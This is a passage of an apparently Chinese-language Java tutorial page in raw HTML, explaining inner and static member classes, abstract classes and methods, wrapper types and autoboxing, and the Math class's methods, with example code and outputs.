class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>    EnclosingClass ec = <span class="hljs-keyword">new</span> EnclosingClass();<br>    ec.<span class="hljs-function">new <span class="hljs-title">EnclosedClass</span><span class="hljs-params">()</span>.<span class="hljs-title">accessEnclosingClass</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// Output: 1</span><br>  &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br><span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>实例：使用内部类ItemList来存储项目。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Item</span> </span>&#123;<br>  <span class="hljs-keyword">private</span> String name;<br>  <span class="hljs-keyword">private</span> String desc;<br><br>  Item(String name, String desc) &#123;<br>    <span class="hljs-keyword">this</span>.name = name;<br>    <span class="hljs-keyword">this</span>.desc = desc;<br>  &#125;<br><br>  <span class="hljs-function">String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> name;<br>  &#125;<br><br>  <span class="hljs-function">String <span class="hljs-title">getDesc</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> desc;<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Name = &quot;</span> + getName() + <span class="hljs-string">&quot;, Desc = &quot;</span> + getDesc();<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ItemManager</span> </span>&#123;<br>  <span class="hljs-keyword">private</span> ItemList itemList;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<br><br>  ItemManager() &#123;<br>    itemList = <span class="hljs-keyword">new</span> ItemList(<span class="hljs-number">2</span>);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">hasMoreElements</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> index &lt; itemList.size();<br>  &#125;<br><br>  <span class="hljs-function">Item <span class="hljs-title">nextElement</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> itemList.get(index++);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(Item item)</span> </span>&#123;<br>    itemList.add(item);<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ItemList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Item[] itemArray;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<br><br>    ItemList(<span class="hljs-keyword">int</span> initSize) &#123;<br>      itemArray = <span class="hljs-keyword">new</span> Item[initSize];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(Item item)</span> </span>&#123;<br>      <span class="hljs-keyword">if</span> (index &gt;= itemArray.length) &#123;<br>        Item[] temp = <span class="hljs-keyword">new</span> Item[itemArray.length * <span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; itemArray.length; i++)<br>          temp[i] = itemArray[i];<br>        itemArray = temp;<br>      &#125;<br>      itemArray[index++] = item;<br>    &#125;<br><br>    <span class="hljs-function">Item <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> </span>&#123;<br>      <span class="hljs-keyword">return</span> itemArray[i];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123;<br>      <span class="hljs-keyword">return</span> index;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>    ItemManager itemManager = <span class="hljs-keyword">new</span> ItemManager();<br>    itemManager.add(<span class="hljs-keyword">new</span> Item(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>));<br>    itemManager.add(<span class="hljs-keyword">new</span> Item(<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>));<br>    itemManager.add(<span class="hljs-keyword">new</span> Item(<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>));<br>    <span class="hljs-keyword">while</span> (itemManager.hasMoreElements())<br>      System.out.println(itemManager.nextElement());<br>  &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>Name=<span class="hljs-number">1</span>,Desc=A<br>Name=<span class="hljs-number">2</span>,Desc=B<br>Name=<span class="hljs-number">3</span>,Desc=C<br></code></pre></div></td></tr></table></figure><blockquote><p>定义和使用内部类。</p></blockquote><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Outer</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> outer_x = <span class="hljs-number">100</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> </span>&#123;<br>    Inner inner = <span class="hljs-keyword">new</span> Inner();<br>    inner.display();<br>  &#125;<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Inner</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">display</span><span class="hljs-params">()</span> </span>&#123;<br>      System.out.println(<span class="hljs-string">&quot;display: outer_x = &quot;</span> + outer_x);<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;<br>    Outer outer = <span class="hljs-keyword">new</span> Outer();<br>    outer.test();<br>  &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>display:outer_x=<span class="hljs-number">100</span><br></code></pre></div></td></tr></table></figure><blockquote><p>内部类成员只能在内部类中访问，并且可能不被外部类使用。</p></blockquote><p>实例：以下实例编译时会产生错误。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> outer_x = <span class="hljs-number">100</span>;<br>  <span class="hljs-comment">// this is an inner class</span><br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Inner</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> y = <span class="hljs-number">10</span>; <span class="hljs-comment">// y is local to Inner</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">display</span><span class="hljs-params">()</span> </span>&#123;<br>      System.out.println(<span class="hljs-string">&quot;display: outer_x = &quot;</span> + outer_x);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">showy</span><span class="hljs-params">()</span> </span>&#123;<br>    System.out.println(y); <br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="1-1-4-静态成员类"><a href="#1-1-4-静态成员类" class="headerlink" title="1.1.4 静态成员类"></a>1.1.4 静态成员类</h4><p>静态成员类是封闭类的静态成员。静态成员类不能访问包含类的实例字段并调用其实例方法。静态成员可以访问包含类的静态字段并调用其静态方法，包括私有字段和方法。</p><p>实例：静态成员类声明。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>    Main.EnclosedClass.accessEnclosingClass(); <br>    Main.EnclosedClass ec = <span class="hljs-keyword">new</span> Main.EnclosedClass();<br>    ec.accessEnclosingClass2(); <br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> outerVariable;<br><br>  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">privateStaticOuterMethod</span><span class="hljs-params">()</span> </span>&#123;<br>    System.out.println(outerVariable);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">staticOuterMethod</span><span class="hljs-params">()</span> </span>&#123;<br>    EnclosedClass.accessEnclosingClass();<br>  &#125;<br><br>  <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EnclosedClass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">accessEnclosingClass</span><span class="hljs-params">()</span> </span>&#123;<br>      outerVariable = <span class="hljs-number">1</span>;<br>      privateStaticOuterMethod();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">accessEnclosingClass2</span><span class="hljs-params">()</span> </span>&#123;<br>      staticOuterMethod();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>静态成员类可以声明其封闭类的多个实现。</p><h3 id="1-2-Java-抽象类"><a href="#1-2-Java-抽象类" class="headerlink" title="1.2 Java 抽象类"></a>1.2 Java 抽象类</h3><p>抽象类是抽象的想法或概念。Java语言中使用abstract class来定义抽象类。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<span class="hljs-comment">//定义一个抽象类</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-comment">//普通方法</span><br>System.out.println(<span class="hljs-string">&quot;存在方法体的方法&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//抽象方法，没有方法体，有abstract关键字做修饰</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>抽象类不能用来实例化对象，声明抽象类的唯一目的是为了将来对该类进行扩充。<br>一个类不能同时被 abstract 和 final 修饰。如果一个类包含抽象方法，那么该类一定要声明为抽象类，否则将出现编译错误。<br>抽象类可以包含抽象方法和非抽象方法。</p><p>抽象方法是一种没有任何实现的方法，该方法的的具体实现由子类提供。<br>抽象方法不能被声明成 final 和 static。<br>任何继承抽象类的子类必须实现父类的所有抽象方法，除非该子类也是抽象类。<br>如果一个类包含若干个抽象方法，那么该类必须声明为抽象类。抽象类可以不包含抽象方法。<br>抽象方法的声明以分号结尾，例如：public abstract sample();。</p><p>在 Java 中 abstract 即抽象，一般使用 abstract 关键字修饰的类或方法。<br>修饰的类时，一定有构造器（构造函数），便于子类实例化时调用。</p><blockquote><p>1.不能被实例化，需要继承抽象类后才能实例化其子类。<br>2.访问权限可以使用public、private、protected，其表达形式为：（public）abstract class 类名{}<br>3.抽象类不能使用final关键字修饰，因为final修饰的类是无法被继承<br>4.可以定义构造方法、静态方法、普通方法；非抽象的普通成员变量、静态成员变量</p></blockquote><p>修饰的方法时，只需要声明方法，不需要写方法体（大括号也不写）。</p><blockquote><p>1.含有该抽象方法的类必须定义为抽象类，但抽象类可以没有抽象方法。<br>2.访问权限可以使用public、default、protected，不能为private，因为抽象方法必须被子类实现（覆写），而private权限对于子类来 说是不能访问的，所以就会产生矛盾，<br>3.不能用static修饰，因为没有主体<br>4.若子类没有重写父类中的所有抽象方法，则此子类必须也是一个抽象类，用abstract修饰；否则必须全部重写父类中的抽象类方法。</p></blockquote><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span>  <span class="hljs-class"><span class="hljs-keyword">class</span>  <span class="hljs-title">MyAbstract</span> </span>&#123;<br><span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;小米&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> price= <span class="hljs-number">1800</span>;<br><br>MyAbstract(String name)&#123;<br><span class="hljs-keyword">this</span>.name = name;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(name);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(price);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//权限不能为 private //抽象方法</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="1-2-1-抽象方法"><a href="#1-2-1-抽象方法" class="headerlink" title="1.2.1 抽象方法"></a>1.2.1 抽象方法</h4><p>一个类包含一个特别的成员方法，该方法的具体实现由它的子类确定，那么可以在父类中声明该方法为抽象方法。<br>Abstract关键字同样可以用来声明抽象方法，抽象方法只包含一个方法名，而没有方法体。抽象方法没有定义，方法名后面直接跟一个分号，而不是花括号。</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Employee</span></span>&#123;<br>   <span class="hljs-keyword">private</span> String name;<br>   <span class="hljs-keyword">private</span> String address;<br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> number;<br>   <br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">double</span> <span class="hljs-title">computePay</span><span class="hljs-params">()</span></span>;<br>   <br>   <span class="hljs-comment">//其余代码</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>声明抽象方法会造成以下两个结果：</p><blockquote><ol><li>如果一个类包含抽象方法，那么该类必须是抽象类。</li><li>任何子类必须重写父类的抽象方法，或者声明自身为抽象类。</li></ol></blockquote><p>继承抽象方法的子类必须重写该方法。否则，该子类也必须声明为抽象类。最终，必须有子类实现该抽象方法，否则，从最初的父类到最终的子类都不能用来实例化对象。</p><p>如果Salary类继承了Employee类，那么它必须实现 computePay() 方法。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/* 文件名 : Salary.java */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Salary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Employee</span></span>&#123;<br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">double</span> salary; <span class="hljs-comment">// Annual salary</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span> <span class="hljs-title">computePay</span><span class="hljs-params">()</span></span>&#123;<br>      System.out.println(<span class="hljs-string">&quot;Computing salary pay for &quot;</span> + getName());<br>      <span class="hljs-keyword">return</span> salary/<span class="hljs-number">52</span>;<br>   &#125;<br>   <span class="hljs-comment">//其余代码</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="2-Java-Number类"><a href="#2-Java-Number类" class="headerlink" title="2.Java Number类"></a>2.Java Number类</h2><p>一般情况下会使用的8种数据的基本数据类型：byte、int、short、long、double、float、boolean、char；<br>对应的包装类型也有八种：Byte、Integer、Short、Long、Double、Float、Character、Boolean;<br>包装类型都是用 final 声明了，不可以被继承重写；在实际情况中编译器会自动的将基本数据类型装箱成对象类型，或者将对象类型拆箱成基本数据类型。具体可以看《JAVA基础知识复习(八)-包装类、装箱拆箱》。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><span class="hljs-keyword">int</span> num1 = <span class="hljs-number">1</span>;<br><span class="hljs-comment">//将基本数据类型装箱成对象包装类型</span><br>Integer num2 = num1;<br>Integer num3 = <span class="hljs-number">3</span>;<br><span class="hljs-comment">//将对象数据类拆箱</span><br><span class="hljs-keyword">int</span> num4 = num3;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>Number 类是 java.lang 包下的一个抽象类，提供了将包装类型拆箱成基本类型的方法，所有基本类型（数据类型）的包装类型都继承了该抽象类，并且是final声明不可继承改变。</p><table><thead><tr><th align="center">包装类</th><th align="center">基本数据类型</th></tr></thead><tbody><tr><td align="center">Boolean</td><td align="center">boolean</td></tr><tr><td align="center">Byte</td><td align="center">byte</td></tr><tr><td align="center">Short</td><td align="center">short</td></tr><tr><td align="center">Integer</td><td align="center">int</td></tr><tr><td align="center">Long</td><td align="center">long</td></tr><tr><td align="center">Character</td><td align="center">char</td></tr><tr><td align="center">Float</td><td align="center">float</td></tr><tr><td align="center">Double</td><td align="center">double</td></tr></tbody></table><p><img src="https://img-blog.csdnimg.cn/20210519194304442.jpg"></p><p>这种由编译器特别支持的包装称为装箱，所以当内置数据类型被当作对象使用的时候，编译器会把内置类型装箱为包装类。相似的，编译器也可以把一个对象拆箱为内置类型。</p><h2 id="3-Java-Math类"><a href="#3-Java-Math类" class="headerlink" title="3.Java Math类"></a>3.Java Math类</h2><p>Java 的 Math 包含了用于执行基本数学运算的属性和方法，如初等指数、对数、平方根和三角函数。Math 的方法都被定义为 static 形式，通过 Math 类可以在主函数中直接调用。</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span> <span class="hljs-params">(String []args)</span></span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;90 度的正弦值：&quot;</span> + Math.sin(Math.PI/<span class="hljs-number">2</span>));  <br>        System.out.println(<span class="hljs-string">&quot;0度的余弦值：&quot;</span> + Math.cos(<span class="hljs-number">0</span>));  <br>        System.out.println(<span class="hljs-string">&quot;60度的正切值：&quot;</span> + Math.tan(Math.PI/<span class="hljs-number">3</span>));  <br>        System.out.println(<span class="hljs-string">&quot;1的反正切值： &quot;</span> + Math.atan(<span class="hljs-number">1</span>));  <br>        System.out.println(<span class="hljs-string">&quot;π/2的角度值：&quot;</span> + Math.toDegrees(Math.PI/<span class="hljs-number">2</span>));  <br>        System.out.println(Math.PI);  <br>    &#125;  <br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br><span class="hljs-number">90</span> 度的正弦值：<span class="hljs-number">1.0</span><br><span class="hljs-number">0</span>度的余弦值：<span class="hljs-number">1.0</span><br><span class="hljs-number">60</span>度的正切值：<span class="hljs-number">1.7320508075688767</span><br><span class="hljs-number">1</span>的反正切值： <span class="hljs-number">0.7853981633974483</span><br>π/<span class="hljs-number">2</span>的角度值：<span class="hljs-number">90.0</span><br><span class="hljs-number">3.141592653589793</span><br></code></pre></div></td></tr></table></figure><h3 id="Number-amp-Math-类方法"><a href="#Number-amp-Math-类方法" class="headerlink" title="Number &amp; Math 类方法"></a>Number &amp; Math 类方法</h3><p>常用的 Number 类和 Math 类的方法。</p><table><thead><tr><th align="center">方法</th><th align="center">描述</th><th>用法</th></tr></thead><tbody><tr><td align="center">xxxValue()</td><td align="center">将number对象转换为xxx数据类型的值并返回。</td><td>x.doubleValue()</td></tr><tr><td align="center">compareTo()</td><td align="center">将number对象与参数比较。</td><td>x.compareTo(y)</td></tr><tr><td align="center">equals()</td><td align="center">判断number对象是否与参数相等。</td><td>x.equals(y)</td></tr><tr><td align="center">valueOf()</td><td align="center">返回一个Integer对象指定的内置数据类型</td><td>Integer.valueOf(“x”,y)</td></tr><tr><td align="center">toString()</td><td align="center">以字符串形式返回值。</td><td>x.toString()</td></tr><tr><td align="center">parseInt()</td><td align="center">将字符串解析为int类型。</td><td>Integer.parseInt(“x”,y)</td></tr><tr><td align="center">abs()</td><td align="center">返回参数的绝对值。</td><td></td></tr><tr><td align="center">ceil()</td><td align="center">返回大于等于( &gt;= )给定参数的的最小整数，类型为双精度浮点型。</td><td></td></tr><tr><td align="center">floor()</td><td align="center">返回小于等于（&lt;=）给定参数的最大整数 。</td><td></td></tr><tr><td align="center">rint()</td><td align="center">返回与参数最接近的整数。返回类型为double。</td><td></td></tr><tr><td align="center">round()</td><td align="center">返回一个最接近的int、long型值。</td><td></td></tr><tr><td align="center">min()</td><td align="center">返回两个参数中的最小值。</td><td></td></tr><tr><td align="center">max()</td><td align="center">返回两个参数中的最大值。</td><td></td></tr><tr><td align="center">exp()</td><td align="center">返回自然数底数e的参数次方。</td><td></td></tr><tr><td align="center">log()</td><td align="center">返回参数的自然数底数的对数值。</td><td></td></tr><tr><td align="center">pow()</td><td align="center">返回第一个参数的第二个参数次方。</td><td></td></tr><tr><td align="center">sqrt()</td><td align="center">求参数的算术平方根。</td><td></td></tr><tr><td align="center">sin()</td><td align="center">求指定double类型参数的正弦值。</td><td></td></tr><tr><td align="center">cos()</td><td align="center">求指定double类型参数的余弦值。</td><td></td></tr><tr><td align="center">tan()</td><td align="center">求指定double类型参数的正切值。</td><td></td></tr><tr><td align="center">asin()</td><td align="center">求指定double类型参数的反正弦值。</td><td></td></tr><tr><td align="center">acos()</td><td align="center">求指定double类型参数的反余弦值。</td><td></td></tr><tr><td align="center">atan()</td><td align="center">求指定double类型参数的反正切值。</td><td></td></tr><tr><td align="center">atan2()</td><td align="center">将笛卡尔坐标转换为极坐标，并返回极坐标的角度值。</td><td></td></tr><tr><td align="center">toDegrees()</td><td align="center">将参数转化为角度。</td><td></td></tr><tr><td align="center">toRadians()</td><td align="center">将角度转换为弧度。</td><td></td></tr><tr><td align="center">random()</td><td align="center">返回一个随机数。</td><td></td></tr></tbody></table><h4 id="1-parseInt-用法"><a href="#1-parseInt-用法" class="headerlink" title="1. parseInt() 用法"></a>1. parseInt() 用法</h4><p>parseInt() 方法用于将字符串参数作为有符号的十进制整数进行解析。如果方法有两个参数， 